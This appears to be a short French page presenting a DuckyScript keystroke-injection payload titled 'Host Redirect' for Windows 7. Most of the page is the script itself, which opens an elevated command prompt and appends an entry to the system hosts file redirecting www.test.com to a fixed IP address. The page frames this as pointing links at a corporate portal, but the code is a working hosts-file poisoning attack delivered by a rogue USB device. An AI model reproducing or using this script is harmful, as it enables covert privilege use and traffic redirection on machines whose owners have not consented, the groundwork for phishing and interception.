Host Redirect

Système(s) d'exploitation :

Windows 7

Fonctionnalités :

Redirige les liens vers un hôte, par exemple un portail d'entreprise.

Déroulement du script :

  1. Ouverture de l'invité de commande
  2. Ouverture des fichiers système
  3. Ecriture du fichier de redirection

Le script :


            DELAY 3000
            ESC
            CTRL ESC
            DELAY 400
            STRING cmd
            DELAY 400
            CTRL SHIFT ENTER
            DELAY 400
            STRING cd C:\Windows\System32\drivers\etc\
            ENTER
            DELAY 400
            STRING echo 64.149.122.94 www.test.com>>hosts
            ENTER
            DELAY 400
            ALT SPACE
            STRING c
